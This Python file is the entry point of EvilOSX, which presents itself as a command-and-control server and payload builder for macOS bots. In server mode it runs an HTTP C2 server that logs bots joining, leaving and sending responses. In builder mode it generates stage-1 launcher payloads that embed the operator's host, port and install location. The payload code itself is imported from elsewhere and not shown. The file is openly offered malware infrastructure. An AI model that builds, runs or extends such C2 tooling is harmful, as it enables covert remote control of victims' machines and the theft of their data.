#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Entry point for the EvilOSX C2 server and the launcher builder.

Both modes share one argument parser:

  * server (default)        starts the async HTTP server and the console view
  * builder (``--builder``) writes a stage-1 launcher for one new bot

Everything that can be validated cheaply is validated *before* expensive work
happens: the database path is checked on disk, ``--cache-size`` is handed to
:class:`server.model.Model`, and ``--loader`` is resolved against
``bot/loaders``. Failures are reported as one-line messages plus an exit code;
pass ``--debug`` to get verbose logging and full tracebacks.

Exit codes: 0 success, 1 failure, 2 invalid arguments, 130 interrupted.
"""

from __future__ import annotations

__author__ = "Marten4n6"
__license__ = "GPLv3"

import argparse
import asyncio
import importlib
import logging
import os
import sqlite3
import sys
from datetime import datetime
from pathlib import Path
from threading import Lock
from time import perf_counter
from uuid import uuid4

from server.version import VERSION
from server.view.helper import ViewABC

LOGGER = logging.getLogger("evilosx")

PROJECT_ROOT = Path(__file__).resolve().parent
LOADERS_DIR = PROJECT_ROOT / "bot" / "loaders"
DEFAULT_BUILDS_DIR = PROJECT_ROOT / "data" / "builds"
DEFAULT_PROGRAM_DIRECTORY = "~/.local/share"

EXIT_OK = 0
EXIT_FAILURE = 1
EXIT_INTERRUPT = 130  # 128 + SIGINT, the usual shell convention


BANNER = """\
▓█████ ██▒   █▓ ██▓ ██▓     ▒█████    ██████ ▒██   ██▒
▓█   ▀▓██░   █▒▓██▒▓██▒    ▒██▒  ██▒▒██    ▒ ▒▒ █ █ ▒░
▒███   ▓██  █▒░▒██▒▒██░    ▒██░  ██▒░ ▓██▄   ░░  █   ░
▒▓█  ▄  ▒██ █░░░██░▒██░    ▒██   ██░  ▒   ██▒ ░ █ █ ▒   @{} (v{})
░▒████▒  ▒▀█░  ░██░░██████▒░ ████▓▒░▒██████▒▒▒██▒ ▒██▒  GPLv3 licensed
░░ ▒░ ░  ░ ▐░  ░▓  ░ ▒░▓  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░▒▒ ░ ░▓ ░
 ░ ░  ░  ░ ░░   ▒ ░  ░ ░   ░  ░ ░ ▒  ░  ░  ░   ░    ░
    ░       ░░   ▒ ░  ░ ░   ░ ░   ░ ░        ░   ░
    ░  ░     ░   ░      ░  ░    ░ ░        ░   ░
""".format(__author__, VERSION)


MESSAGE_INFO = "[\033[94mI\033[0m] "
MESSAGE_ATTENTION = "[\033[91m!\033[0m] "

# The rest of the code base passes semantic tags ("info", "attention") as the
# prefix of ViewABC.output(); map them to printable markers. Unknown prefixes
# are rendered verbatim so no information is silently lost.
_PREFIX_MARKERS: dict[str, str] = {
    "info": MESSAGE_INFO,
    "attention": MESSAGE_ATTENTION,
}

# The same markers without escape sequences, used when the stream is not a
# terminal (pipes, log files, CI) or when the user set NO_COLOR.
_PLAIN_PREFIX_MARKERS: dict[str, str] = {
    "info": "[I] ",
    "attention": "[!] ",
}


class StartupError(Exception):
    """A configuration or environment problem that aborts startup cleanly."""


def _port(value: str) -> int:
    """argparse type: a usable TCP port."""
    try:
        port = int(value)
    except (TypeError, ValueError):
        raise argparse.ArgumentTypeError(f"expected an integer, got {value!r}")

    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError(f"port must be between 1 and 65535, got {port}")
    return port


def _positive_int(value: str) -> int:
    """argparse type: an integer greater than zero."""
    try:
        number = int(value)
    except (TypeError, ValueError):
        raise argparse.ArgumentTypeError(f"expected an integer, got {value!r}")

    if number < 1:
        raise argparse.ArgumentTypeError(f"expected a positive integer, got {number}")
    return number


def available_loaders() -> list[str]:
    """Names of the loaders that ship an ``install.py``, sorted."""
    if not LOADERS_DIR.is_dir():
        return []
    return sorted(entry.name for entry in LOADERS_DIR.iterdir()
                  if (entry / "install.py").is_file())


def _loader_name(value: str) -> str:
    """argparse type: a loader directory that exists under bot/loaders."""
    loaders = available_loaders()

    if value not in loaders:
        raise argparse.ArgumentTypeError(
            "unknown loader {!r} (available: {})".format(
                value, ", ".join(loaders) or "none"))
    return value


def build_parser() -> argparse.ArgumentParser:
    """Build the command line parser (kept separate so it can be unit tested)."""
    parser = argparse.ArgumentParser(
        prog="start.py",
        description="EvilOSX C2 server and launcher builder.",
    )
    parser.add_argument(
        "--host", default=None,
        help="address to bind to / to embed in payloads "
             "(default: all interfaces; required with --builder)")
    parser.add_argument(
        "--port", type=_port, default=1337,
        help="TCP port to listen on (default: %(default)s)")
    parser.add_argument(
        "--db-path", default=None,
        help="SQLite database file (default: data/EvilOSX.db)")
    parser.add_argument(
        "--cache-size", type=_positive_int, default=None,
        help="entries kept in the bot lookup cache (default: model default)")
    parser.add_argument(
        "--builder", action="store_true",
        help="generate a launcher payload instead of serving")
    parser.add_argument(
        "--loader", type=_loader_name, default="run_script",
        help="loader embedded in the payload (default: %(default)s)")
    parser.add_argument(
        "--program-directory", default=DEFAULT_PROGRAM_DIRECTORY,
        help="install directory baked into the payload (default: %(default)s)")
    parser.add_argument(
        "--output-dir", default=str(DEFAULT_BUILDS_DIR),
        help="where builder mode writes launchers (default: %(default)s)")
    parser.add_argument(
        "--no-banner", action="store_true",
        help="do not print the banner")
    parser.add_argument(
        "--debug", action="store_true",
        help="verbose logging and full tracebacks")
    return parser


def _timestamp() -> str:
    """Current wall-clock time, formatted for output lines."""
    return datetime.now().strftime("%H:%M:%S")


def _single_line(value: object) -> str:
    """Coerce ``value`` to one printable line without a trailing newline."""
    text = value if isinstance(value, str) else str(value)
    return text.rstrip("\r\n")


def _stream_supports_colour(stream: object) -> bool:
    """True when ANSI escape sequences are safe to write to ``stream``."""
    if os.environ.get("NO_COLOR") or os.environ.get("TERM") == "dumb":
        return False
    try:
        return stream.isatty()
    except (AttributeError, ValueError):
        return False  # detached stream, or a file-like object without isatty()


class ConsoleView(ViewABC):
    """Prints server events to a stream; implements the ViewABC contract."""

    def __init__(self, stream: object | None = None, colour: bool | None = None) -> None:
        self._stream = stream if stream is not None else sys.stdout
        if colour is None:
            colour = _stream_supports_colour(self._stream)
        # Resolve the marker table once instead of on every line.
        self._markers = _PREFIX_MARKERS if colour else _PLAIN_PREFIX_MARKERS
        # The server may call the view from several tasks; the lock keeps
        # concurrent writes from interleaving inside a single line.
        self._lock = Lock()

    def output(self, line: object, prefix: object = "") -> None:
        """Print one timestamped line, colourising known prefixes."""
        self._write([self._format(line, prefix)])

    def _format(self, line: object, prefix: object, stamp: str | None = None) -> str:
        """Render one ``[HH:MM:SS] <marker><line>`` string."""
        return "[{}] {}{}".format(
            stamp or _timestamp(), self._marker(prefix), _single_line(line))

    def _marker(self, prefix: object) -> str:
        """Printable marker for a semantic tag; unknown tags pass through."""
        if not prefix:
            return ""

        if not isinstance(prefix, str):
            return f"{prefix} "

        tag = prefix.strip().lower()
        marker = self._markers.get(tag)
        if marker is not None:
            return marker

        text = str(prefix)
        return text if text.endswith(" ") else text + " "

    def _write(self, lines: list[str]) -> None:
        """Write all ``lines`` with a single flush; never raise to the caller."""
        payload = "".join(line + "\n" for line in lines)
        with self._lock:
            try:
                self._stream.write(payload)
                self._stream.flush()
            except (ValueError, OSError) as error:
                # Closed stream or broken pipe: losing a line is better than
                # tearing down the server loop.
                LOGGER.debug("console view is not writable: %s", error)

    def display_info(self, text: object) -> None:
        """Used by :func:`server.handler.start_server` for status messages."""
        self.output(text, "info")

    def display_error(self, text: object) -> None:
        self.output(text, "attention")

    def on_response(self, response: str) -> None:
        # One timestamp and one write for the whole block: a large module
        # response would otherwise cost a flush per line.
        stamp = _timestamp()
        head = "[{}] ".format(stamp)
        body = _single_line(response).splitlines()
        self._write([head + "-" * 5] + [head + line for line in body])

    def on_bot_added(self, bot: object) -> None:
        self.output("Bot joined: {}@{} ({}).".format(
            bot.username, bot.hostname, bot.uid), "info")

    def on_bot_removed(self, bot: object) -> None:
        self.output("Bot removed: {}@{} ({}).".format(
            bot.username, bot.hostname, bot.uid), "info")

    def on_bot_path_change(self, bot: object) -> None:
        self.output("Bot path changed: {}@{} -> {}.".format(
            bot.username, bot.hostname, bot.local_path), "info")


def _configure_stdio() -> None:
    """Force UTF-8 output so the banner survives non-UTF-8 consoles."""
    for stream in (sys.stdout, sys.stderr):
        reconfigure = getattr(stream, "reconfigure", None)
        if reconfigure is None:
            continue
        try:
            reconfigure(encoding="utf-8", errors="replace")
        except (ValueError, OSError):
            pass  # stream does not support reconfiguration (e.g. a pipe)


def _configure_logging(debug: bool) -> None:
    """Keep stdout clean for the view; diagnostics go to stderr."""
    logging.basicConfig(
        level=logging.DEBUG if debug else logging.WARNING,
        format="[%(levelname)s] %(name)s: %(message)s",
        stream=sys.stderr,
    )


def _resolve_db_path(raw_path: str | None) -> Path | None:
    """Validate ``--db-path`` early and return a resolved path (or None)."""
    if not raw_path:
        return None

    db_path = Path(raw_path).expanduser()
    if not db_path.is_absolute():
        db_path = Path.cwd() / db_path
    db_path = db_path.resolve()

    parent = db_path.parent
    if not parent.is_dir():
        raise StartupError(f"database directory does not exist: {parent}")
    if db_path.exists() and not db_path.is_file():
        raise StartupError(f"database path is not a file: {db_path}")
    if not os.access(str(parent), os.W_OK):
        raise StartupError(f"database directory is not writable: {parent}")
    return db_path


def _create_model(args: argparse.Namespace) -> object:
    """Build the model, applying ``--db-path`` and ``--cache-size``."""
    from server.model import Model

    db_path = _resolve_db_path(args.db_path)
    started = perf_counter()

    try:
        model = Model(
            db_path=str(db_path) if db_path else None,
            cache_size=args.cache_size,
        )
    except (OSError, sqlite3.Error) as error:
        raise StartupError(f"cannot open database {db_path or '<default>'}: {error}")

    LOGGER.debug(
        "model ready in %.0f ms (db=%s, cache-size=%s)",
        (perf_counter() - started) * 1000.0,
        db_path or "<default>",
        args.cache_size or "<default>",
    )
    return model


def _report_error(message: str) -> None:
    LOGGER.error("%s", message)
    print("[ERROR] " + message, file=sys.stderr, flush=True)


_ADDRESS_IN_USE_ERRNOS = frozenset({10048, 48, 98})


def _is_address_in_use(error: BaseException) -> bool:
    """True when ``error`` means the bind address is already occupied."""
    if not isinstance(error, OSError):
        return False
    # Windows places the Winsock code into ``winerror``; aiohttp/runtime also
    # keeps it in ``errno``. Manual reproductions (OSError(10048, ...)) put it
    # in ``errno`` only, so check both plus the textual description.
    code = getattr(error, "winerror", None) or getattr(error, "errno", None)
    if code not in _ADDRESS_IN_USE_ERRNOS:
        return False
    text = str(error).lower()
    return "address" in text or "socket" in text or "use" in text


def run_server(args: argparse.Namespace) -> int:
    """Start the async server and block until it is stopped."""
    from server import handler  # late import keeps --help fast

    if not handler.HAS_AIOHTTP:
        raise StartupError("aiohttp is required to run the server (pip install aiohttp)")

    model = _create_model(args)
    view = ConsoleView()
    started = perf_counter()
    bind_host = args.host or ""

    try:
        # An empty host binds every interface, as documented by start_server().
        asyncio.run(handler.start_server(model, view, args.port, bind_host))
    except OSError as error:
        if _is_address_in_use(error):
            raise StartupError(f"port {args.port} is already in use (try --port <other>)")
        raise
    finally:
        # Bot updates are batched in memory; never drop them on shutdown.
        try:
            model.flush_batches()
        except Exception:  # shutdown must not mask the original error
            LOGGER.exception("failed to flush pending database writes")

    view.output(f"Server stopped after {perf_counter() - started:.1f}s.", "info")
    return EXIT_OK


def run_builder(args: argparse.Namespace) -> int:
    """Write a stage-1 launcher for one new bot into ``--output-dir``."""
    from server.model import PayloadFactory

    output_dir = Path(args.output_dir).expanduser()
    try:
        output_dir.mkdir(parents=True, exist_ok=True)
    except OSError as error:
        raise StartupError(f"cannot create output directory {output_dir}: {error}")
    if not output_dir.is_dir():
        raise StartupError(f"output path is not a directory: {output_dir}")

    bot_uid = str(uuid4())
    payload_options = {"host": args.host, "port": args.port}
    loader_options = {
        "loader_name": args.loader,
        "program_directory": args.program_directory,
    }

    try:
        payload = PayloadFactory().create_payload(
            bot_uid, payload_options, loader_options)
    except (OSError, KeyError) as error:
        raise StartupError(f"payload generation failed: {error}")

    launcher_path = output_dir / f"Launcher-{bot_uid[:8]}.py"
    try:
        # Explicit encoding and LF: the target is macOS, the host may be Windows.
        with launcher_path.open("w", encoding="utf-8", newline="\n") as launcher:
            launcher.write(payload)
    except OSError as error:
        raise StartupError(f"cannot write {launcher_path}: {error}")

    try:
        # Owner-only access, in one code path for every platform: Windows only
        # maps the read-only bit, which a freshly written file already has
        # cleared, so the call is a no-op there instead of a platform branch
        # that static analysis reports as dead code for the other OS.
        launcher_path.chmod(0o700)
    except OSError as error:
        raise StartupError(f"cannot set permissions on {launcher_path}: {error}")

    print()
    print(f"[INFO] Launcher generated: {launcher_path}")
    print(f"[INFO] Bot UID: {bot_uid}")
    print(f"[INFO] Server: {args.host}:{args.port}")
    print(f"[INFO] Loader: {args.loader} (program directory: {args.program_directory})")
    return EXIT_OK


def main(argv: list[str] | None = None) -> int:
    """Parse arguments, dispatch to a mode and return a process exit code."""
    _configure_stdio()

    parser = build_parser()
    args = parser.parse_args(argv)

    if args.builder and not args.host:
        parser.error("--host is required with --builder "
                     "(the payload must know the server address)")

    _configure_logging(args.debug)
    if not args.no_banner:
        print(BANNER)

    try:
        if args.builder:
            _check_dependency("Cryptodome.Cipher.AES", "pycryptodomex")
            return run_builder(args)
        _check_dependency("aiohttp", "aiohttp")
        return run_server(args)
    except StartupError as error:
        LOGGER.error("startup failure: %s", error)
        _report_error(str(error))
        return EXIT_FAILURE
    except KeyboardInterrupt:
        print()
        print("Interrupted, shutting down.")
        return EXIT_INTERRUPT
    except Exception as error:  # top-level guard: report, do not dump a traceback
        if args.debug:
            raise
        LOGGER.error("unexpected failure: %s (%s)", error, type(error).__name__)
        _report_error(f"unexpected failure: {type(error).__name__}: {error} (re-run with --debug for a traceback)")
        return EXIT_FAILURE


def _check_dependency(module_name: str, package_name: str) -> None:
    """Ensure ``module_name`` can be imported; raise ``StartupError`` otherwise."""
    try:
        importlib.import_module(module_name)
    except ImportError as error:
        raise StartupError(
            f"{package_name} is required "
            f"(pip install {package_name}): {error}"
        )


if __name__ == "__main__":
    sys.exit(main())